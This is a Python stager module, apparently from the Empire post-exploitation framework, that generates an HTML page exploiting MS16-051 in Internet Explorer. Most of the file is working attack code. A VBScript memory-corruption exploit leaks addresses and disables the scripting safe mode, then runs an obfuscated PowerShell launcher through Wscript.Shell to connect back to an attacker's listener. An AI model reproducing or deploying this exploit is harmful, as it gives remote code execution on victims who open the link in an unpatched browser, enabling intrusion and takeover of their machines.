from __future__ import print_function
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'MS16-051 IE RCE',

            'Author': ['CrossGroupSecurity'],

            'Description':
                'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which '
                'works on IE9/10/11 and all versions of Windows. Target will have to open link with vulnerable version '
                'of IE.',

            'Comments': [
                'https://github.com/CrossGroupSecurity/PowerShell-MS16-051-IE-RCE'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for '
                               'obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For '
                               'powershell only.',
                'Required': False,
                'Value': r'Token\All\1,Launcher\STDIN++\12467'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': 'index.html'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listener_name, language=language, encode=encode, obfuscate=obfuscate_script,
            obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
            stagerRetries=stager_retries)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        else:
            code = f"""
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)
        
        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                  ReDim Preserve A(1, 2000)
            End Sub
            
            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class
        
        Class Dummy
        End Class
        
        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper
        
            For i = 0 To 32
                Set plunge(i) = s
            Next
        
            Set aw.A(arg1, 2) = s
        
            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                   addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next
        
            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If
            getAddr = addr
        End Function
        
        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)
        
            aw = Null
            Set aw = New ArrayWrapper
        
            Dim o
            o = aw.A(arg1, 2)
        
            leakMem = o
        End Function
        
        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)
        
            aw = Null
            Set aw = New ArrayWrapper
        
        
            aw.A(arg1, 2) = CSng(0)
        End Sub
        
        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem
        
        
            Set dm = New Dummy
        
            addr = getAddr(arg1, dm)
        
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
        
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            overwrite arg1, olescript + &H174
        Set Object = CreateObject("Wscript.Shell")
        Object.run("{launcher}")
        End Function

        Function triggerBug
            aw.Resize()
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>
        
    <script type="text/javascript">
        function strToInt(s)
        {{
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }}
        function intToStr(x)
        {{
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }}
        var o;
        o = {{"valueOf": function () {{
                triggerBug();
                return 1;
            }}}};
        setTimeout(function() {{exploit(o);}}, 50);
    </script>
</body>
</html>
"""

        return code
